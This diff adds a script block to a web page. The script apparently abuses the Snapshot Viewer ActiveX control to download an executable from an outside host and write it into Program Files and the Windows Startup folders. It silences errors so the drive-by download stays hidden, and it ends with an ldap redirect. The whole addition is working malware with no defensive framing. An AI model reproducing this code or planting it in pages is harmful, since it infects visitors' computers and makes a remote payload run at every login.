@@ -1,0 +1,45 @@
+<script type="text/javascript">
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+
+var x;
+var obj;
+var Evilcute = new Array();
+Evilcute[0] = "c:/Program Files/wsv.exe";
+Evilcute[1] = "d:/Program Files/wsv.exe";
+Evilcute[2] = "e:/Program Files/wsv.exe";
+Evilcute[3] = "C:/Documents and Settings/All Users/「开始」菜单/程序/启动/Thunder.exe";
+Evilcute[4] = "C:/Documents and Settings/All Users/Start Menu/Programs/Startup/Thunder.exe";
+
+var Objx = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+
+if(Objx="[object]")
+{
+
+setTimeout('window.location = "ldap://"',3000);
+
+for (x in Evilcute)
+{
+obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+
+var buf1 = 'http://www.skywebsv.com/play/cer.exe';
+var buf2=Evilcute[x];
+
+obj.Zoom = 0;
+obj.ShowNavigationButtons = false;
+obj.AllowContextMenu = false;
+obj.SnapshotPath = buf1;
+
+try
+{
+ obj.CompressedPath = buf2;
+ obj.PrintSnapshot();
+
+}catch(e){}
+
+}
+}
+
+</script>
